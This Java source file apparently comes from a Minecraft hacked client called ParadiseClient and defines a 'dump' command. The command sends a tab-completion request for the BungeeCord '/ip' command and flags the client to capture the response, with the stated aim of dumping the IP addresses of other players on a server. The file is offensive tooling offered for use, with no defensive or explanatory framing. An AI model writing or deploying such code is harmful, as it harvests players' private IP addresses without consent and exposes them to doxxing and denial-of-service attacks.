package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.paradise_client.Helper;
import net.paradise_client.ParadiseClient;
import net.paradise_client.command.Command;

import java.util.Random;

public class DumpCommand extends Command {
    public DumpCommand() {
        super("dump", "IP dumping methods");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            ParadiseClient.MISC_MOD.requestId = new Random().nextInt();
            Helper.sendPacket(new RequestCommandCompletionsC2SPacket(
                    ParadiseClient.MISC_MOD.requestId, "/ip ")
            );
            ParadiseClient.MISC_MOD.isDumping = true;
            Helper.printChatMessage("Attempting to dump IPs via bungee /ip method!");
            return Command.SINGLE_SUCCESS;
        });
    }
}
